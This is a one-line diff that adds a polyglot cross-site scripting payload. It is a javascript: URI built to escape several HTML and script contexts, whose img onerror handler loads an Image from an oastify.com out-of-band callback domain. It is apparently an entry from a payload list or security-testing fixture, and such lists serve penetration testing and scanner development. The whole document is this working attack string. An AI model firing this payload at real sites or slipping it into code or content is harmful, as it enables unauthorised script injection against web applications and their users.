@@ -1,0 +1,1 @@
+javascript:/*</script><img/onerror='-/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/an1w6j6opuwqky2dockf2wb2yt4osfq3iu6mtdm1bX;.oastify.com/).replace(/.;/g,[])]//'src=>
